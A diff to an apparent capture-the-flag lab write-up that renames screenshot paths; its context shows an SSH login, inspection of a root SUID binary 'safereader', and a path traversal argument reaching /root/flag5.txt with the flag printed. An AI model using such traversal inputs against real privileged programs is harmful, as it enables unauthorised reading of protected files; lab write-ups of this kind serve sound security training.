@@ -17,7 +17,7 @@ id
 
 **Observed:** `archivist`, `nigcl-archive`, `uid=1001(archivist) gid=1001(archivist)`.
 
-![Successful Kali SSH login as archivist](images/M5-RED-01-SSH-Authentication.png)
+![Successful Kali SSH login as archivist](images/Red-M5-RED-01-SSH-Authentication.png)
 
 *Evidence: `M5-RED-01-SSH-Authentication.png`*
 
@@ -29,7 +29,7 @@ cat ~/README.txt
 
 **Observed:** Archive Server README instructs using `safereader /opt/classified/contract_summary.txt`, states only `/opt/classified/` documents are accessible, and lists `archive-admin@nigcl.internal` as contact.
 
-![M5 Archive README hint](images/M5-RED-02-Challenge-Hint.png)
+![M5 Archive README hint](images/Red-M5-RED-02-Challenge-Hint.png)
 
 *Evidence: `M5-RED-02-Challenge-Hint.png`*
 
@@ -41,7 +41,7 @@ ls -la /usr/local/bin/safereader
 
 **Observed:** `-rwsr-xr-x 1 root root 16416 ... /usr/local/bin/safereader`; SUID bit set for a root-owned executable.
 
-![Root-owned SUID safereader permissions](images/M5-RED-03-SUID-Binary-Inspection.png)
+![Root-owned SUID safereader permissions](images/Red-M5-RED-03-SUID-Binary-Inspection.png)
 
 *Evidence: `M5-RED-03-SUID-Binary-Inspection.png`*
 
@@ -53,7 +53,7 @@ safereader /opt/classified/contract_summary.txt
 
 **Observed:** Contract summary containing three contract records; legitimate read succeeded.
 
-![Authorized NIGCL contract summary](images/M5-RED-04-Legitimate-Document-Access.png)
+![Authorized NIGCL contract summary](images/Red-M5-RED-04-Legitimate-Document-Access.png)
 
 *Evidence: `M5-RED-04-Legitimate-Document-Access.png`*
 
@@ -67,7 +67,7 @@ safereader "/opt/classified/../../../root/flag5.txt"
 
 **Observed output:** `FLAG{42eab633e0ebb393_suid_nigcl_final}`.
 
-![Traversal bypass and Flag 5 returned](images/M5-RED-05-Path-Traversal-Flag-Retrieval.png)
+![Traversal bypass and Flag 5 returned](images/Red-M5-RED-05-Path-Traversal-Flag-Retrieval.png)
 
 *Evidence: `M5-RED-05-Path-Traversal-Flag-Retrieval.png`*
 
